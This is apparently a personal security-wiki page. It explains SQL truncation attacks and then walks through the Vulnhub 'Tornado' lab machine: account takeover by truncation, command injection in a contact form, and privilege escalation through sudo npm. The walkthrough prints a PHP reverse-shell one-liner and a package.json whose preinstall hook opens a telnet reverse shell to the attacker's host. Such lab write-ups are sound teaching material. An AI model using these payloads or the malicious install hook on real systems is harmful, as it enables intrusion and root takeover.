The **SQL truncation attack**, also known as **SQL Truncation**, is an attack technique where an attacker attempts to **truncate** or **cut** an SQL query to perform malicious actions on a **database**.

A common example of this attack occurs when a web application has an input field with length limitations, such as for email, and fails to properly validate input data.

For instance, consider a registration page where users must provide an email address and password to create a new account. Suppose the database field for the email address is limited to **17 characters**.

If the user '**admin@admin.com**' already exists in the database, registering the same user would initially fail because the underlying SQL query would detect a duplicate entry. However, since '**admin@admin.com**' is only **15 characters** long and hasn't reached the limit, an attacker could attempt to register the user '**admin@admin.com a**', or more clearly: '**admin@admin.com[space][space]a**'.

This new email string is **18 characters** long. While it differs from the existing email (admin@admin.com), the database's **17-character limit** truncates it during insertion, resulting in '**admin@admin.com  **' (or '**admin@admin.com[space][space]**').

Now, what happens to the trailing spaces? Since they hold no meaningful data, they are **truncated**—automatically removed. The final string becomes '**admin@admin.com**', allowing the attacker to overwrite the password during registration for this supposed "**new user**".

This attack works when the web application fails to properly validate input data and truncates the SQL query instead of showing an error message. Consequently, attackers can exploit this weakness to perform malicious actions on the database, such as modifying or deleting data, accessing sensitive information, or taking over user accounts.

To prevent SQL truncation attacks, it's crucial to properly validate all user input used in SQL queries. Validation should include both length and format checks.

---

**LABORATORY**

- **Vulnhub Machine: Tornado**: [https://www.vulnhub.com/entry/ia-tornado,639/](https://www.vulnhub.com/entry/ia-tornado,639/)

First, we'll perform some fuzzing with GoBuster on the Apache web server running on port 80 (discovered via Nmap):
![Pasted image 20260211173805](/VaultSite/wiki-images/Pasted%20image%2020260211173805.png)
We find several directories, but the one we're interested in is `bluesky`:
![Pasted image 20260211173832](/VaultSite/wiki-images/Pasted%20image%2020260211173832.png)
It's another webpage, and Wappalyzer doesn't reveal the language or other details. Let's fuzz this page for PHP files (we could also try .txt, .js, etc.):
![Pasted image 20260211174115](/VaultSite/wiki-images/Pasted%20image%2020260211174115.png)
We find many results. Navigating to `login.php`, we see an authentication panel that appears vulnerable. We test various injection types (SQL, NoSQL, XPATH), but none work:
![Pasted image 20260211174204](/VaultSite/wiki-images/Pasted%20image%2020260211174204.png)

Manual brute-forcing reveals that the email field restricts input to 13 characters (verified via Ctrl+U):
![Pasted image 20260211174359](/VaultSite/wiki-images/Pasted%20image%2020260211174359.png)
This is unusual for this field.

Next, we visit `signup.php`, which resembles the previous page. We register with an email and password:
![Pasted image 20260211174513](/VaultSite/wiki-images/Pasted%20image%2020260211174513.png)
Attempting to re-register with the same user triggers a notification and fails:
![Pasted image 20260211174551](/VaultSite/wiki-images/Pasted%20image%2020260211174551.png)
After logging in, the dashboard shows several tabs:
![Pasted image 20260211174625](/VaultSite/wiki-images/Pasted%20image%2020260211174625.png)
The "Contact" tab denies access due to "security reasons":
![Pasted image 20260211181619](/VaultSite/wiki-images/Pasted%20image%2020260211181619.png)

The "Portfolio" tab mentions a patched LFI vulnerability but suggests reviewing it:
![Pasted image 20260211174717](/VaultSite/wiki-images/Pasted%20image%2020260211174717.png)
Inspecting the page source reveals a path:
![Pasted image 20260211174754](/VaultSite/wiki-images/Pasted%20image%2020260211174754.png)
This isn't a direct LFI, but Apache is configured with an alias allowing access to the `tornado` directory.

Given the path, we infer the existence of a user `tornado`. We test the `ls ~/` function to list the current user's home directory. If the alias `tornado` exists, we can access its home directory using `~tornado/`:
![Pasted image 20260211175420](/VaultSite/wiki-images/Pasted%20image%2020260211175420.png)
![Pasted image 20260211175427](/VaultSite/wiki-images/Pasted%20image%2020260211175427.png)

Attempting to register `jacob@tornado` (exactly 13 characters) fails as the user already exists:
![Pasted image 20260211180241](/VaultSite/wiki-images/Pasted%20image%2020260211180241.png)
By editing the client-side 13-character limit, we register `jacob@tornado a`. This bypasses the filter (since we modified it), and the web allows it because the email differs from `jacob@tornado`. 

The database truncates the email to 13 characters, leaving `jacob@tornado  `. SQL removes trailing spaces, resulting in `jacob@tornado`. Instead of throwing an error, the database **validates our data against this existing user**, effectively overwriting the password with our chosen one during registration. This grants us access to `jacob@tornado` with our password:
![Pasted image 20260211181112](/VaultSite/wiki-images/Pasted%20image%2020260211181112.png)
![Pasted image 20260211181141](/VaultSite/wiki-images/Pasted%20image%2020260211181141.png)
![Pasted image 20260211181157](/VaultSite/wiki-images/Pasted%20image%2020260211181157.png)

Now, the "Contact" tab reveals a comment box:
![Pasted image 20260211181642](/VaultSite/wiki-images/Pasted%20image%2020260211181642.png)
Testing with "hola" confirms interpretation:
![Pasted image 20260211181912](/VaultSite/wiki-images/Pasted%20image%2020260211181912.png)
`whoami` doesn't resolve, but `;sleep 5` delays the response by 5 seconds, confirming some Bash command execution:
![Pasted image 20260211182202](/VaultSite/wiki-images/Pasted%20image%2020260211182202.png)
Sending `whoami` to our listening machine confirms the user is `www-data`:
![Pasted image 20260211182348](/VaultSite/wiki-images/Pasted%20image%2020260211182348.png)
![Pasted image 20260211182406](/VaultSite/wiki-images/Pasted%20image%2020260211182406.png)

We set up a listener with Netcat on port 4444 and inject a reverse shell:
**php -r ‘$sock=fsockopen(“192.168.1.2”,4545);exec(“/bin/sh -i <&3 >&3 2>&3”);’**
![Pasted image 20260211181829](/VaultSite/wiki-images/Pasted%20image%2020260211181829.png)
A simpler payload also works:
![Pasted image 20260211182424](/VaultSite/wiki-images/Pasted%20image%2020260211182424.png)
![Pasted image 20260211182433](/VaultSite/wiki-images/Pasted%20image%2020260211182433.png)

Now, we proceed with privilege escalation.

With `sudo -l` we list what commands you can execute as another user, normally the root user but here it's called catchme.  
Here we can see we can use the [npm](obsidian://open?vault=David-Cyber&file=NPM) program (allows installing things and executing scripts) with catchme(root) permissions without a password.  
![Pasted image 20260211183405](/VaultSite/wiki-images/Pasted%20image%2020260211183405.png)  

Once we see this, what we can do is create a folder and upload a JSON file to it that will come from our machine via wget.  
We create the JSON file in our shell, and in the scripts section with the `preinstall` directive, we're telling it to execute this command before installing anything—this is where we insert our reverse shell:  
```json
{  
  "name": "hola",  
  "version": "1.0.0",  
  "description": "",  
  "main": "index.js",  
  "scripts": {  
    "preinstall": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet 192.168.1.110 9002 > /tmp/f"  
  }  
}
```  

We start the HTTP server, and from the victim machine we download the package with wget:  
![Pasted image 20260211184648](/VaultSite/wiki-images/Pasted%20image%2020260211184648.png)  
Then we give permissions to the folder we created to host the file with `chmod 777` to avoid permission errors later.  

Now, with `sudo -u catchme /usr/bin/npm i /tmp/jin --unsafe`, we're saying: execute this command as catchme, use npm to install (`i`) the package from the jin folder, and with `--unsafe` we bypass the block npm sometimes applies to prevent running scripts as root.  

![Pasted image 20260211185423](/VaultSite/wiki-images/Pasted%20image%2020260211185423.png)![Pasted image 20260211185433](/VaultSite/wiki-images/Pasted%20image%2020260211185433.png)  

Once inside with root permissions, we find an `enc.py`. Examining it, we see it's a Caesar cipher. We pass it through [boxentriq](https://www.boxentriq.com/ciphers/caesar-cipher) to brute-force it.  
It gives us a password, but when we try it, it doesn't work. Looking closer, it seems to say `idkrootpassword`.  
![Pasted image 20260211185816](/VaultSite/wiki-images/Pasted%20image%2020260211185816.png)  
If we try it, we get root:  
![Pasted image 20260211185834](/VaultSite/wiki-images/Pasted%20image%2020260211185834.png)
